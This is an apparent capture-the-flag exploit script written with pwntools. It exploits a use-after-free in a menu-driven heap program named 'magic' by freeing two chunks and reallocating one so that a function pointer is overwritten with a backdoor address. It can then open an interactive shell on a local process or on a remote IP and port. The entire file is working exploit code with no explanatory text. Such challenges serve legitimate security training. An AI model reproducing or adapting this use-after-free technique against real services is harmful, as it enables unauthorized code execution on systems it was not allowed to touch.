#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./magic")
	elf = ELF("./magic")
else:
	p = remote('59.110.243.101',54621)
	elf = ELF("./magic")

def menu(cmd):
    sla("Your choice :",str(cmd))

def add(sz,ct):
    menu(1)
    sla("magic cost ?:",str(sz))
    sla("name :",ct)

def delete(idx):
    menu(2)
    sla("index :",str(idx))

def use(idx):
    menu(3)
    sla("index :",str(idx))

backdoor = 0x400A0D

add(0x30,'AAAA')#0
add(0x30,'BBBB')#1

delete(0)
delete(1)

add(0x10,p64(backdoor) + p64(backdoor))

use(0)

#gdb.attach(p)

ia()
